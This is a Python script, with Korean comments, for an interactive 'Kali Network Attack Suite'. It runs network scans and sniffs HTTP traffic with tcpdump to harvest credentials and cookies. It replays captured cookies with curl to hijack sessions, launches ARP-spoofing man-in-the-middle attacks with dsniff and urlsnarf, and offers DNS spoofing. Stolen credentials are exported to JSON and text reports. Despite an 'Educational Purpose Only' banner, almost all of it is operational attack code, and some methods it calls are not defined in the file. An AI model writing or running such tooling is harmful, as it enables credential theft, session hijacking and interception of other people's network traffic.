#!/usr/bin/env python3
import subprocess
import os
import sys
import re
import json
import time
import threading
from datetime import datetime
import signal

class KaliNetworkAttackSuite:
    """통합 네트워크 공격 도구 클래스"""
    
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.captured_data = {
            "credentials": [],
            "cookies": [],
            "sessions": [],
            "hosts": []
        }
        self.processes = []
        self.is_running = False
        
    # === 기존 메서드들은 동일 ===
    
    def check_root(self):
        """Root 권한 확인"""
        if os.geteuid() != 0:
            print("[!] This script requires root privileges!")
            sys.exit(1)
    
    # === 새로 추가된 메서드들 (기존 외부 함수들) ===
    
    def quick_scan(self):
        """빠른 네트워크 스캔 - 클래스 메서드로 변경"""
        self.check_root()
        
        print("[*] Quick network scan...")
        hosts = self.scan_network()  # self로 접근
        
        # 각 호스트의 열린 포트 스캔
        scan_results = {}
        for host in hosts:
            print(f"\n[*] Scanning {host}...")
            cmd = f"nmap -F -T4 {host}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            open_ports = []
            for line in result.stdout.split('\n'):
                if "open" in line and "tcp" in line:
                    print(f"    {line.strip()}")
                    open_ports.append(line.strip())
            
            scan_results[host] = open_ports
        
        # 스캔 결과를 클래스 데이터에 저장
        self.captured_data['scan_results'] = scan_results
        return scan_results
    
    def monitor_http_traffic(self, duration=60):
        """HTTP 트래픽 모니터링 - 클래스 메서드로 변경"""
        print(f"[*] Monitoring HTTP traffic for {duration} seconds...")
        
        self.is_running = True  # 클래스 상태 활용
        start_time = time.time()
        
        cmd = f"timeout {duration} tcpdump -i {self.interface} -nn -A -s0 'tcp port 80 or tcp port 8080' 2>/dev/null"
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, text=True)
        self.processes.append(process)  # 프로세스 관리
        
        # 임시 저장소
        temp_credentials = []
        temp_cookies = []
        temp_urls = []
        
        buffer = ""
        for line in iter(process.stdout.readline, ''):
            if not self.is_running:  # 클래스 상태로 중단 제어
                break
                
            buffer += line
            
            # HTTP 요청 완료 시 파싱
            if line.strip() == "" and buffer:
                # URL 추출
                url_match = re.search(r'(GET|POST)\s+([^\s]+)\s+HTTP', buffer)
                if url_match:
                    temp_urls.append(url_match.group(2))
                
                # 크레덴셜 추출 - 클래스 메서드 활용
                self._extract_credentials(buffer)
                
                # 쿠키 추출 - 클래스 메서드 활용
                self._extract_cookies(buffer)
                
                buffer = ""
        
        # 모니터링 결과를 클래스 데이터에 통합
        monitor_summary = {
            "duration": duration,
            "start_time": datetime.fromtimestamp(start_time).isoformat(),
            "urls_captured": len(set(temp_urls)),
            "unique_urls": list(set(temp_urls))[:20]
        }
        
        self.captured_data['monitor_summary'] = monitor_summary
        
        # 결과 출력
        print(f"\n[+] Monitoring complete!")
        print(f"[*] Total captured - Credentials: {len(self.captured_data['credentials'])}, "
              f"Cookies: {len(self.captured_data['cookies'])}")
        
        return monitor_summary
    
    def session_hijack_test(self, cookie_string, target_url):
        """세션 하이재킹 테스트 - 클래스 메서드로 변경"""
        print(f"[*] Testing session hijack on {target_url}")
        
        # curl을 사용한 요청
        cmd = f'curl -s -I -H "Cookie: {cookie_string}" "{target_url}"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        # 상태 코드 확인
        status_match = re.search(r'HTTP/\d\.\d\s+(\d+)', result.stdout)
        
        hijack_result = {
            "timestamp": datetime.now().isoformat(),
            "target_url": target_url,
            "cookie_used": cookie_string[:50] + "..." if len(cookie_string) > 50 else cookie_string,
            "success": False,
            "status_code": None,
            "response_headers": result.stdout
        }
        
        if status_match:
            status_code = status_match.group(1)
            hijack_result["status_code"] = status_code
            
            print(f"[+] Response status: {status_code}")
            
            if status_code == "200":
                print("[+] Session hijack successful!")
                hijack_result["success"] = True
            elif status_code in ["301", "302"]:
                print("[*] Redirect detected - might need to follow")
            else:
                print("[-] Session might be invalid")
        
        # 테스트 결과를 클래스 데이터에 저장
        if 'hijack_tests' not in self.captured_data:
            self.captured_data['hijack_tests'] = []
        
        self.captured_data['hijack_tests'].append(hijack_result)
        
        return hijack_result
    
    def run_interactive_menu(self):
        """대화형 메뉴 - main 함수를 클래스 메서드로 변경"""
        print("""
        ╔════════════════════════════════════════════╗
        ║        Kali Network Attack Suite           ║
        ║         Educational Purpose Only!          ║
        ╚════════════════════════════════════════════╝
        
        1. Full MITM Attack (ARP + Sniffing)
        2. Quick Network Scan
        3. Monitor HTTP Traffic
        4. DNS Spoofing Attack
        5. Test Session Hijacking
        6. Analyze Captured Data
        7. Export All Results
        
        """)
        
        choice = input("Select option (1-7): ")
        
        if choice == "1":
            self._run_mitm_attack()
            
        elif choice == "2":
            self.quick_scan()
            
        elif choice == "3":
            duration = input("Duration in seconds (default: 60): ") or "60"
            self.monitor_http_traffic(int(duration))
            
        elif choice == "4":
            self._run_dns_attack()
            
        elif choice == "5":
            self._test_session_hijacking()
            
        elif choice == "6":
            self._analyze_captured_data()
            
        elif choice == "7":
            filename = input("Export filename (default: results.json): ") or "results.json"
            self.export_all_results(filename)
    
    def _run_mitm_attack(self):
        """MITM 공격 실행 (private 메서드)"""
        target = input("Target IP (leave empty for auto-select): ")
        
        network_info = self.get_network_info()
        
        if not target:
            hosts = self.scan_network()
            if hosts:
                print("\n[*] Available targets:")
                for i, host in enumerate(hosts):
                    print(f"    {i+1}. {host}")
                
                choice = input("\nSelect target (number): ")
                try:
                    target = hosts[int(choice)-1]
                except:
                    print("[!] Invalid selection")
                    return
        
        print(f"\n[*] Starting MITM attack on {target}")
        
        self.enable_ip_forward()
        self.arp_spoof(target, network_info['gateway'])
        time.sleep(3)
        
        # 여러 스니핑 도구 동시 실행
        self.start_tcpdump()
        self.start_urlsnarf()
        self.start_dsniff()
        
        print("\n[+] Attack running. Press Enter to stop...")
        input()
        
        self.cleanup()
        self.save_results()
    
    def _test_session_hijacking(self):
        """세션 하이재킹 테스트 (private 메서드)"""
        if not self.captured_data['cookies']:
            print("[!] No captured cookies available")
            print("[*] Run MITM attack or HTTP monitoring first")
            return
        
        print("\n[*] Available cookies:")
        for i, cookie in enumerate(self.captured_data['cookies'][-10:]):  # 최근 10개
            print(f"{i+1}. {cookie['cookie'][:80]}...")
        
        choice = input("\nSelect cookie (number): ")
        target_url = input("Target URL: ")
        
        try:
            selected_cookie = self.captured_data['cookies'][int(choice)-1]['cookie']
            self.session_hijack_test(selected_cookie, target_url)
        except:
            print("[!] Invalid selection")
    
    def _analyze_captured_data(self):
        """캡처된 데이터 분석 (private 메서드)"""
        print("\n[*] Captured Data Summary:")
        print(f"    Credentials: {len(self.captured_data['credentials'])}")
        print(f"    Cookies: {len(self.captured_data['cookies'])}")
        print(f"    Sessions: {len(self.captured_data['sessions'])}")
        print(f"    Hosts: {len(self.captured_data['hosts'])}")
        
        if self.captured_data['credentials']:
            print("\n[+] Recent Credentials:")
            for cred in self.captured_data['credentials'][-5:]:
                print(f"    {cred}")
    
    def export_all_results(self, filename):
        """모든 결과를 파일로 내보내기"""
        export_data = {
            "export_time": datetime.now().isoformat(),
            "interface": self.interface,
            "captured_data": self.captured_data
        }
        
        with open(filename, 'w') as f:
            json.dump(export_data, f, indent=4)
        
        print(f"[+] All results exported to {filename}")
        
        # 추가로 읽기 쉬운 텍스트 보고서 생성
        report_filename = filename.replace('.json', '_report.txt')
        with open(report_filename, 'w') as f:
            f.write("=== Network Attack Report ===\n")
            f.write(f"Generated: {datetime.now()}\n\n")
            
            if self.captured_data['credentials']:
                f.write("CREDENTIALS FOUND:\n")
                for cred in self.captured_data['credentials']:
                    f.write(f"  - {cred}\n")
            
            f.write(f"\nTotal items captured:\n")
            f.write(f"  - Credentials: {len(self.captured_data['credentials'])}\n")
            f.write(f"  - Cookies: {len(self.captured_data['cookies'])}\n")
            f.write(f"  - Sessions: {len(self.captured_data['sessions'])}\n")
        
        print(f"[+] Human-readable report saved to {report_filename}")

# === 이제 메인 실행 부분만 클래스 외부에 ===
if __name__ == "__main__":
    # Ctrl+C 핸들러
    def signal_handler(sig, frame):
        print("\n[!] Caught interrupt signal")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # 통합 공격 도구 실행
    attack_suite = KaliNetworkAttackSuite()
    attack_suite.check_root()
    attack_suite.run_interactive_menu()


# 실행 방법 : sudo python3 network_attack.py